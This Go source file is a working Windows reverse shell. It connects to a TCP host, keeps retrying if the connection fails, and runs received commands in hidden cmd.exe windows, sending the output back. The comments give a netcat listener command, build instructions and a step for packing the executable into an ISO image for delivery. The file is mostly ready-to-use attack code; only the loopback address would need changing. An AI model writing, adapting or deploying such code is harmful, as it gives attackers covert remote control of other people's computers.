// +build windows

// Reverse Windows CMD
// Test with nc -lvvp 6666
// reverseshell go
// create iso
// genisoimage -o output_image.iso directory_name
// GOOS=windows go build -o goshell.exe revshell.go

package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main() {
	reverse("127.0.0.1:6666")
}

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			reverse(host)
			return
		}

		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}

